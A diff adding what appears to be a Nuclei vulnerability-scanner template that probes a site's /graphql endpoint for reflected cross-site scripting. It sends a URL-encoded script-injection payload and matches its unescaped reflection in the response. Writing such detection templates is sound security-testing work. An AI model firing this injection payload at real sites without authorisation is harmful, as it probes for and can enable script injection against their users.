@@ -1,0 +1,41 @@
+id: kaue-xss-query-graphql
+
+info:
+  name: kauequeryhraphql
+  author: kauenavarro
+  severity: medium
+  description: Procura por respostas refletidas.
+  tags: xss
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/graphql?query=1%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Ealert%28document.domain%29%3C/ScRiPt%3E"
+    
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "><script>alert(document.domain)</script>"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: word
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
+        part: body
+        condition: and
+        negative: true
+
+      - type: status
+        status:
+          - 400
+  
+               
